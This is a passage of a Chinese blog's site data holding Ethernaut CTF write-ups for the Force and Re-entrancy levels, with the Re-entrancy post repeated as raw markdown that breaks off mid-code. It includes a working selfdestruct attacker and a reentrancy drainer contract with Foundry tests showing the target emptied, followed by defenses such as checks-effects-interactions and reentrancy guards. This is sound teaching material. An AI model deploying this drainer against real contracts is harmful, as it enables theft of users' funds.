attack(address payable target) public &#123;</span><br><span class=\"line\">        // 🎯 关键攻击：使用 selfdestruct 强制发送以太币</span><br><span class=\"line\">        selfdestruct(target);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract ForceTest is Test &#123;</span><br><span class=\"line\">    Force public force;</span><br><span class=\"line\">    ForceAttacker public attacker;</span><br><span class=\"line\">    </span><br><span class=\"line\">    address public user = makeAddr(&quot;user&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        // 部署 Force 合约</span><br><span class=\"line\">        force = new Force();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 给用户一些以太币</span><br><span class=\"line\">        vm.deal(user, 10 ether);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testForceExploit() public &#123;</span><br><span class=\"line\">        console.log(&quot;=== 攻击前状态 ===&quot;);</span><br><span class=\"line\">        console.log(&quot;Force 合约余额:&quot;, address(force).balance);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.startPrank(user);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 部署攻击合约并发送以太币</span><br><span class=\"line\">        attacker = new ForceAttacker&#123;value: 1 ether&#125;();</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;攻击合约余额:&quot;, address(attacker).balance);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 🎯 执行攻击：自毁并强制发送以太币</span><br><span class=\"line\">        attacker.attack(payable(address(force)));</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;=== 攻击后状态 ===&quot;);</span><br><span class=\"line\">        console.log(&quot;Force 合约余额:&quot;, address(force).balance);</span><br><span class=\"line\">        console.log(&quot;攻击合约余额:&quot;, address(attacker).balance);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 验证攻击成功</span><br><span class=\"line\">        assertGt(address(force).balance, 0);</span><br><span class=\"line\">        console.log(&quot;攻击成功！Force 合约现在有以太币了&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testNormalTransferFails() public &#123;</span><br><span class=\"line\">        vm.startPrank(user);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 尝试正常发送以太币 - 应该失败</span><br><span class=\"line\">        (bool success,) = address(force).call&#123;value: 1 ether&#125;(&quot;&quot;);</span><br><span class=\"line\">        assertFalse(success);</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;正常转账失败，如预期&quot;);</span><br><span class=\"line\">        assertEq(address(force).balance, 0);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testPreComputedAddress() public &#123;</span><br><span class=\"line\">        // 演示预计算地址方法</span><br><span class=\"line\">        address futureAddress = computeCreateAddress(user, vm.getNonce(user) + 1);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.startPrank(user);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 向未来地址发送以太币</span><br><span class=\"line\">        (bool success,) = futureAddress.call&#123;value: 1 ether&#125;(&quot;&quot;);</span><br><span class=\"line\">        assertFalse(success); // 地址不存在，发送失败</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;预计算地址:&quot;, futureAddress);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"其他强制发送方法\"><a href=\"#其他强制发送方法\" class=\"headerlink\" title=\"其他强制发送方法\"></a>其他强制发送方法</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract AlternativeAttacks &#123;</span><br><span class=\"line\">    // 方法 2: 预计算地址 (实际中很难实现)</span><br><span class=\"line\">    function preComputedAttack() public payable &#123;</span><br><span class=\"line\">        // 1. 计算目标合约的未来部署地址</span><br><span class=\"line\">        // 2. 向该地址发送以太币</span><br><span class=\"line\">        // 3. 在该地址部署目标合约</span><br><span class=\"line\">        // 注意：这需要控制部署时机，实际中很困难</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 方法 3: 作为矿工设置 coinbase (仅理论上可能)</span><br><span class=\"line\">    function coinbaseAttack() public &#123;</span><br><span class=\"line\">        // 如果你是矿工，可以将目标地址设为 coinbase</span><br><span class=\"line\">        // 挖矿奖励会直接发送到该地址</span><br><span class=\"line\">        // 但这需要巨大的算力投入</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><h3 id=\"1-避免依赖合约余额进行逻辑判断\"><a href=\"#1-避免依赖合约余额进行逻辑判断\" class=\"headerlink\" title=\"1. 避免依赖合约余额进行逻辑判断\"></a>1. 避免依赖合约余额进行逻辑判断</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract VulnerableContract &#123;</span><br><span class=\"line\">    // ❌ 危险：依赖合约余额</span><br><span class=\"line\">    function withdraw() public &#123;</span><br><span class=\"line\">        require(address(this).balance == 0, &quot;Contract must be empty&quot;);</span><br><span class=\"line\">        // 可被 selfdestruct 攻击绕过</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract SafeContract &#123;</span><br><span class=\"line\">    uint256 private internalBalance;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // ✅ 安全：使用内部记账</span><br><span class=\"line\">    function deposit() public payable &#123;</span><br><span class=\"line\">        internalBalance += msg.value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function withdraw() public &#123;</span><br><span class=\"line\">        require(internalBalance == 0, &quot;Internal balance must be zero&quot;);</span><br><span class=\"line\">        // 无法被外部强制修改</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-使用内部状态变量\"><a href=\"#2-使用内部状态变量\" class=\"headerlink\" title=\"2. 使用内部状态变量\"></a>2. 使用内部状态变量</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract SecureForce &#123;</span><br><span class=\"line\">    uint256 private receivedAmount;</span><br><span class=\"line\">    </span><br><span class=\"line\">    receive() external payable &#123;</span><br><span class=\"line\">        receivedAmount += msg.value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function getReceivedAmount() public view returns (uint256) &#123;</span><br><span class=\"line\">        return receivedAmount; // 只计算主动接收的以太币</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function getTotalBalance() public view returns (uint256) &#123;</span><br><span class=\"line\">        return address(this).balance; // 包括强制发送的以太币</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-检查余额变化\"><a href=\"#3-检查余额变化\" class=\"headerlink\" title=\"3. 检查余额变化\"></a>3. 检查余额变化</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract BalanceMonitor &#123;</span><br><span class=\"line\">    uint256 private lastKnownBalance;</span><br><span class=\"line\">    </span><br><span class=\"line\">    modifier balanceCheck() &#123;</span><br><span class=\"line\">        uint256 balanceBefore = address(this).balance;</span><br><span class=\"line\">        _;</span><br><span class=\"line\">        uint256 balanceAfter = address(this).balance;</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 检测意外的余额变化</span><br><span class=\"line\">        if (balanceAfter != lastKnownBalance) &#123;</span><br><span class=\"line\">            emit UnexpectedBalanceChange(lastKnownBalance, balanceAfter);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">        lastKnownBalance = balanceAfter;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    event UnexpectedBalanceChange(uint256 expected, uint256 actual);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"📚-核心知识点\"><a href=\"#📚-核心知识点\" class=\"headerlink\" title=\"📚 核心知识点\"></a>📚 核心知识点</h2><h3 id=\"selfdestruct-机制\"><a href=\"#selfdestruct-机制\" class=\"headerlink\" title=\"selfdestruct 机制\"></a>selfdestruct 机制</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract SelfDestructExample &#123;</span><br><span class=\"line\">    constructor() payable &#123;&#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function destroy(address payable recipient) public &#123;</span><br><span class=\"line\">        // selfdestruct 会：</span><br><span class=\"line\">        // 1. 销毁合约代码</span><br><span class=\"line\">        // 2. 将所有以太币发送给 recipient</span><br><span class=\"line\">        // 3. 强制发送，无法被阻止</span><br><span class=\"line\">        selfdestruct(recipient);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"合约接收以太币的方式\"><a href=\"#合约接收以太币的方式\" class=\"headerlink\" title=\"合约接收以太币的方式\"></a>合约接收以太币的方式</h3><table>\n<thead>\n<tr>\n<th>方式</th>\n<th>可被阻止</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>正常转账</strong></td>\n<td>✅ 是</td>\n<td>需要 payable 函数</td>\n</tr>\n<tr>\n<td><strong>selfdestruct</strong></td>\n<td>❌ 否</td>\n<td>强制发送，无法拒绝</td>\n</tr>\n<tr>\n<td><strong>预计算地址</strong></td>\n<td>❌ 否</td>\n<td>发送到未来地址</td>\n</tr>\n<tr>\n<td><strong>矿工奖励</strong></td>\n<td>❌ 否</td>\n<td>Coinbase 奖励</td>\n</tr>\n</tbody></table>\n<h3 id=\"安全编程最佳实践\"><a href=\"#安全编程最佳实践\" class=\"headerlink\" title=\"安全编程最佳实践\"></a>安全编程最佳实践</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ❌ 不安全的模式</span><br><span class=\"line\">contract BadPattern &#123;</span><br><span class=\"line\">    function criticalFunction() public &#123;</span><br><span class=\"line\">        require(address(this).balance == 0, &quot;Must be empty&quot;);</span><br><span class=\"line\">        // 逻辑...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// ✅ 安全的模式  </span><br><span class=\"line\">contract GoodPattern &#123;</span><br><span class=\"line\">    uint256 private expectedBalance;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function criticalFunction() public &#123;</span><br><span class=\"line\">        require(expectedBalance == 0, &quot;Expected balance must be zero&quot;);</span><br><span class=\"line\">        // 逻辑...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function updateExpectedBalance(uint256 amount) private &#123;</span><br><span class=\"line\">        expectedBalance = amount;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p>Force 关卡教导了重要的以太币处理原则：</p>\n<ul>\n<li>✅ <strong>永远不要依赖 <code>address(this).balance</code></strong> - 可以被强制修改</li>\n<li>✅ <strong>使用内部状态跟踪余额</strong> - 更加安全可靠</li>\n<li>✅ <strong>理解 selfdestruct 的强制性</strong> - 无法被合约拒绝</li>\n<li>✅ <strong>设计时考虑意外资金</strong> - 处理非预期的以太币</li>\n</ul>\n<p>这个看似简单的攻击揭示了以太坊虚拟机层面的重要特性。</p>\n<hr>\n<h2 id=\"🔗-相关链接\"><a href=\"#🔗-相关链接\" class=\"headerlink\" title=\"🔗 相关链接\"></a>🔗 相关链接</h2><ul>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-06-delegation/\">上一关: Level 6 - Delegation</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-08-vault/\">下一关: Level 8 - Vault</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">系列目录: Ethernaut Foundry Solutions</a></strong></li>\n<li><strong><a href=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions\">GitHub 项目</a></strong></li>\n</ul>\n"},{"title":"Ethernaut Level 10: Re-entrancy - 经典重入攻击详解","date":"2025-01-25T06:30:00.000Z","updated":"2025-01-25T06:30:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"深入学习最著名的智能合约攻击技术 - 重入攻击，理解其原理、实现和防护措施，这是每个智能合约开发者必须掌握的安全知识。","_content":"\n# 🎯 Ethernaut Level 10: Re-entrancy - 经典重入攻击详解\n\n> **关卡链接**: [Ethernaut Level 10 - Re-entrancy](https://ethernaut.openzeppelin.com/level/10)  \n> **攻击类型**: 重入攻击 (Reentrancy Attack)  \n> **难度**: ⭐⭐⭐⭐☆  \n> **历史影响**: The DAO 攻击事件 (2016年)\n\n## 📋 挑战目标\n\n这是智能合约安全领域最经典的攻击类型之一：\n\n1. **窃取合约资金** - 提取超过自己存款金额的以太币\n2. **理解重入原理** - 掌握状态更新时序问题\n3. **学习防护措施** - 了解如何编写安全的提款函数\n\n## 🔍 漏洞分析\n\n### 合约源码分析\n\n```solidity\npragma solidity ^0.6.12;\n\nimport \"openzeppelin-contracts-06/math/SafeMath.sol\";\n\ncontract Reentrance {\n  \n  using SafeMath for uint256;\n  mapping(address => uint) public balances;\n\n  function donate(address _to) public payable {\n    balances[_to] = balances[_to].add(msg.value);\n  }\n\n  function balanceOf(address _who) public view returns (uint balance) {\n    return balances[_who];\n  }\n\n  // 🚨 漏洞函数\n  function withdraw(uint _amount) public {\n    if(balances[msg.sender] >= _amount) {\n      (bool result,) = msg.sender.call{value:_amount}(\"\");\n      if(result) {\n        balances[msg.sender] -= _amount;  // ❌ 状态更新在外部调用之后\n      }\n    }\n  }\n}\n```\n\n### 漏洞识别\n\n重入攻击的根本原因是 **检查-效果-交互 (CEI)** 模式的违反：\n\n```solidity\nfunction withdraw(uint _amount) public {\n    // ✅ 检查 (Check)\n    if(balances[msg.sender] >= _amount) {\n        \n        // ❌ 交互 (Interaction) - 过早进行外部调用\n        (bool result,) = msg.sender.call{value:_amount}(\"\");\n        \n        if(result) {\n            // ❌ 效果 (Effect) - 状态更新太晚\n            balances[msg.sender] -= _amount;\n        }\n    }\n}\n```\n\n### 攻击原理\n\n1. **恶意合约存款** - 向目标合约存入少量资金\n2. **调用提款函数** - 触发 `withdraw()` 函数\n3. **接收回调** - 在 `call` 执行时触发恶意合约的 `receive()` 函数\n4. **递归调用** - 在状态更新前再次调用 `withdraw()`\n5. **重复提取** - 由于余额未更新，可以多次提取资金\n\n### 攻击流程图\n\n```\n用户调用 withdraw(1 ether)\n    ↓\n检查 balances[attacker] >= 1 ether ✅\n    ↓\n发送 1 ether 到攻击者合约\n    ↓\n攻击者合约的 receive() 被触发\n    ↓\n再次调用 withdraw(1 ether)\n    ↓\n检查 balances[attacker] >= 1 ether ✅ (余额未更新!)\n    ↓\n再次发送 1 ether...\n    ↓\n如此重复，直到合约余额耗尽\n```\n\n## 💻 Foundry 实现\n\n### 攻击合约代码\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/Reentrance.sol\";\n\ncontract ReentrancyAttacker {\n    Reentrance public target;\n    uint public amount;\n    \n    constructor(address _target) {\n        target = Reentrance(_target);\n    }\n    \n    function attack() external payable {\n        amount = msg.value;\n        \n        // 步骤1: 先存入一些资金建立余额\n        target.donate{value: amount}(address(this));\n        \n        // 步骤2: 开始重入攻击\n        target.withdraw(amount);\n    }\n    \n    // 重入攻击的核心 - receive函数\n    receive() external payable {\n        if (address(target).balance >= amount) {\n            // 递归调用withdraw，实现重入\n            target.withdraw(amount);\n        }\n    }\n    \n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n\ncontract ReentranceTest is Test {\n    Reentrance public reentrance;\n    ReentrancyAttacker public attacker;\n    \n    address public user1 = makeAddr(\"user1\");\n    address public user2 = makeAddr(\"user2\");\n    address public attackerAddr = makeAddr(\"attacker\");\n\n    function setUp() public {\n        // 部署目标合约\n        reentrance = new Reentrance();\n        \n        // 给用户一些初始资金\n        vm.deal(user1, 10 ether);\n        vm.deal(user2, 10 ether);\n        vm.deal(attackerAddr, 2 ether);\n        \n        // 模拟正常用户存款\n        vm.prank(user1);\n        reentrance.donate{value: 5 ether}(user1);\n        \n        vm.prank(user2);\n        reentrance.donate{value: 5 ether}(user2);\n        \n        // 部署攻击合约\n        vm.prank(attackerAddr);\n        attacker = new ReentrancyAttacker(address(reentrance));\n    }\n\n    function testReentrancyAttack() public {\n        uint256 contractBalanceBefore = address(reentrance).balance;\n        uint256 attackerBalanceBefore = attackerAddr.balance;\n        \n        console.log(\"合约余额 (攻击前):\", contractBalanceBefore);\n        console.log(\"攻击者余额 (攻击前):\", attackerBalanceBefore);\n        \n        // 执行重入攻击\n        vm.prank(attackerAddr);\n        attacker.attack{value: 1 ether}();\n        \n        uint256 contractBalanceAfter = address(reentrance).balance;\n        uint256 attackerBalanceAfter = attacker.getBalance();\n        \n        console.log(\"合约余额 (攻击后):\", contractBalanceAfter);\n        console.log(\"攻击者余额 (攻击后):\", attackerBalanceAfter);\n        \n        // 验证攻击成功\n        assertEq(contractBalanceAfter, 0);\n        assertGt(attackerBalanceAfter, 1 ether); // 获得超过投入的资金\n    }\n    \n    function testReentrancyDetails() public {\n        vm.prank(attackerAddr);\n        \n        // 记录每次withdraw调用\n        vm.recordLogs();\n        attacker.attack{value: 1 ether}();\n        \n        // 验证攻击者的余额记录\n        assertEq(reentrance.balanceOf(address(attacker)), 0); // 最终余额为0\n        assertEq(address(reentrance).balance, 0); // 合约被掏空\n    }\n}\n```\n\n### 运行测试\n\n```bash\n# 运行重入攻击测试\nforge test --match-contract ReentranceTest -vvv\n\n# 输出应该显示合约余额被完全掏空\n```\n\n## 🛡️ 防御措施\n\n### 1. CEI 模式 (Check-Effects-Interactions)\n\n```solidity\ncontract SecureReentrance {\n    mapping(address => uint) public balances;\n    \n    function withdraw(uint _amount) public {\n        // ✅ 检查 (Check)\n        require(balances[msg.sender] >= _amount, \"Insufficient balance\");\n        \n        // ✅ 效果 (Effect) - 先更新状态\n        balances[msg.sender] -= _amount;\n        \n        // ✅ 交互 (Interaction) - 最后进行外部调用\n        (bool success,) = msg.sender.call{value: _amount}(\"\");\n        require(success, \"Transfer failed\");\n    }\n}\n```\n\n### 2. 重入锁 (Reentrancy Guard)\n\n```solidity\ncontract ReentrancyGuarded {\n    bool private locked;\n    mapping(address => uint) public balances;\n    \n    modifier noReentrant() {\n        require(!locked, \"Reentrant call\");\n        locked = true;\n        _;\n        locked = false;\n    }\n    \n    function withdraw(uint _amount) public noReentrant {\n        require(balances[msg.sender] >= _amount, \"Insufficient balance\");\n        \n        balances[msg.sender] -= _amount;\n        (bool success,) = msg.sender.call{value: _amount}(\"\");\n        require(success, \"Transfer failed\");\n    }\n}\n```\n\n### 3. 使用 OpenZeppelin 的 ReentrancyGuard\n\n```solidity\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\n\ncontract SafeContract is ReentrancyGuard {\n    mapping(address => uint) public balances;\n    \n    function withdraw(uint _amount) public nonReentrant {\n        require(balances[msg.sender] >= _amount, \"Insufficient balance\");\n        \n        balances[msg.sender] -= _amount;\n        (bool success,) = msg.sender.call{value: _amount}(\"\");\n        require(success, \"Transfer failed\");\n    }\n}\n```\n\n### 4. 使用 transfer() 而非 call()\n\n```solidity\n// ⚠️ 有限防护（不推荐作为唯一防护措施）\nfunction withdraw(uint _amount) public {\n    require(balances[msg.sender] >= _amount, \"Insufficient balance\");\n    \n    balances[msg.sender] -= _amount;\n    payable(msg.sender).transfer(_amount); // 限制 Gas 为 2300\n}\n```\n\n## 📚 核心知识点\n\n### 1. 重入攻击类型\n\n| 类型 | 描述 | 示例 |\n|------|------|------|\n| **单函数重入** | 攻击同一个函数 | 本关卡的 `withdraw()` |\n| **跨函数重入** | 攻击不同函数 | `withdraw()` → `transfer()` |\n| **跨合约重入** | 攻击不同合约 | DeFi 协议间的复杂重入 |\n\n### 2. Gas 限制对比\n\n```solidity\n// transfer/send: 2300 gas (不足以进行重入)\npayable(msg.sender).transfer(amount);\n\n// call: 转发所有剩余 gas (可能导致重入)\n(bool success,) = msg.sender.call{value: amount}(\"\");\n```\n\n### 3. 状态更新时序\n\n```solidity\n// ❌ 错误模式\nfunction vulnerable() public {\n    require(condition);        // Check\n    externalCall();           // Interaction (危险!)\n    updateState();            // Effect (太晚了)\n}\n\n// ✅ 正确模式\nfunction secure() public {\n    require(condition);        // Check\n    updateState();            // Effect (先更新状态)\n    externalCall();           // Interaction (安全)\n}\n```\n\n## 🏛️ 历史案例\n\n### The DAO 攻击 (2016年6月)\n\n- **损失**: 360万 ETH (当时价值约6000万美元)\n- **原因**: splitDAO 函数存在重入漏洞\n- **后果**: 以太坊硬分叉，产生 ETH 和 ETC\n- **教训**: 重入攻击的破坏性和防护重要性\n\n### 其他著名案例\n\n1. **Cream Finance** (2021) - 1.3亿美元损失\n2. **bZx Protocol** (2020) - 多次重入攻击\n3. **Uniswap V1** (早期版本) - 理论漏洞\n\n## 🎯 总结\n\n重入攻击是智能合约安全的基石知识：\n\n- ✅ **理解 CEI 模式的重要性**\n- ✅ **掌握多种防护措施的使用**\n- ✅ **认识状态管理的关键性**\n- ✅ **学习历史案例的教训**\n\n重入攻击看似简单，但其变种和组合形式在现代 DeFi 协议中仍然是主要威胁。掌握其原理和防护措施是每个智能合约开发者的必修课。\n\n---\n\n## 🔗 相关链接\n\n- **[上一关: Level 9 - King](/2025/01/25/ethernaut-level-09-king/)**\n- **[下一关: Level 11 - Elevator](/2025/01/25/ethernaut-level-11-elevator/)**\n- **[系列目录: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**\n- **[GitHub 项目](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**\n\n---\n\n*安全的合约不仅要做正确的事，还要以正确的顺序做事。* 🔐","source":"_posts/ethernaut-level-10-reentrancy.md","raw":"---\ntitle: 'Ethernaut Level 10: Re-entrancy - 经典重入攻击详解'\ndate: 2025-01-25 14:30:00\nupdated: 2025-01-25 14:30:00\ncategories:\n  - Ethernaut 系列\n  - 基础攻击篇 (1-10)\ntags:\n  - Ethernaut\n  - Foundry\n  - 重入攻击\n  - Reentrancy\n  - 智能合约安全\n  - Solidity\n  - CEI模式\nseries: Ethernaut Foundry Solutions\nexcerpt: \"深入学习最著名的智能合约攻击技术 - 重入攻击，理解其原理、实现和防护措施，这是每个智能合约开发者必须掌握的安全知识。\"\n---\n\n# 🎯 Ethernaut Level 10: Re-entrancy - 经典重入攻击详解\n\n> **关卡链接**: [Ethernaut Level 10 - Re-entrancy](https://ethernaut.openzeppelin.com/level/10)  \n> **攻击类型**: 重入攻击 (Reentrancy Attack)  \n> **难度**: ⭐⭐⭐⭐☆  \n> **历史影响**: The DAO 攻击事件 (2016年)\n\n## 📋 挑战目标\n\n这是智能合约安全领域最经典的攻击类型之一：\n\n1. **窃取合约资金** - 提取超过自己存款金额的以太币\n2. **理解重入原理** - 掌握状态更新时序问题\n3. **学习防护措施** - 了解如何编写安全的提款函数\n\n## 🔍 漏洞分析\n\n### 合约源码分析\n\n```solidity\npragma solidity ^0.6.12;\n\nimport \"openzeppelin-contracts-06/math/SafeMath.sol\";\n\ncontract Reentrance {\n  \n  using SafeMath for uint256;\n  mapping(address => uint) public balances;\n\n  function donate(address _to) public payable {\n    balances[_to] = balances[_to].add(msg.value);\n  }\n\n  function balanceOf(address _who) public view returns (uint balance) {\n    return balances[_who];\n  }\n\n  // 🚨 漏洞函数\n  function withdraw(uint _amount) public {\n    if(balances[msg.sender] >= _amount) {\n      (bool result,) = msg.sender.call{value:_amount}(\"\");\n      if(result) {\n        balances[msg.sender] -= _amount;  // ❌ 状态更新在外部调用之后\n      }\n    }\n  }\n}\n```\n\n### 漏洞识别\n\n重入攻击的根本原因是 **检查-效果-交互 (CEI)** 模式的违反：\n\n```solidity\nfunction withdraw(uint _amount) public {\n    // ✅ 检查 (Check)\n    if(balances[msg.sender] >= _amount) {\n        \n        // ❌ 交互 (Interaction) - 过早进行外部调用\n        (bool result,) = msg.sender.call{value:_amount}(\"\");\n        \n        if(result) {\n            // ❌ 效果 (Effect) - 状态更新太晚\n            balances[msg.sender] -= _amount;\n        }\n    }\n}\n```\n\n### 攻击原理\n\n1. **恶意合约存款** - 向目标合约存入少量资金\n2. **调用提款函数** - 触发 `withdraw()` 函数\n3. **接收回调** - 在 `call` 执行时触发恶意合约的 `receive()` 函数\n4. **递归调用** - 在状态更新前再次调用 `withdraw()`\n5. **重复提取** - 由于余额未更新，可以多次提取资金\n\n### 攻击流程图\n\n```\n用户调用 withdraw(1 ether)\n    ↓\n检查 balances[attacker] >= 1 ether ✅\n    ↓\n发送 1 ether 到攻击者合约\n    ↓\n攻击者合约的 receive() 被触发\n    ↓\n再次调用 withdraw(1 ether)\n    ↓\n检查 balances[attacker] >= 1 ether ✅ (余额未更新!)\n    ↓\n再次发送 1 ether...\n    ↓\n如此重复，直到合约余额耗尽\n```\n\n## 💻 Foundry 实现\n\n### 攻击合约代码\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/Reentrance.sol\";\n\ncontract ReentrancyAttacker {\n    Reentrance public target;\n    uint public amount;\n    \n    constructor(address _target) {\n        target = Reentrance(_target);\n    }\n    \n    function attack() external payable {\n        amount = msg.value;\n        \n        // 步骤1: 先存入一些资金建立余额\n        target.donate{value: amount}(address(this));\n        \n        // 步骤2: 开始重入攻击\n        target.withdraw(amount);\n    }\n    \n    // 重入攻击的核心 - receive函数\n    receive() external payable {\n        if (address(target).balance >= amount) {\n            // 递归调用withdraw，实现重入\n            target.withdraw(amount);\n        }\n    }\n    \n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n\ncontract ReentranceTest is Test {\n    Reentrance public reentrance;\n    ReentrancyAttacker public attacker;\n    \n    address public user1 = 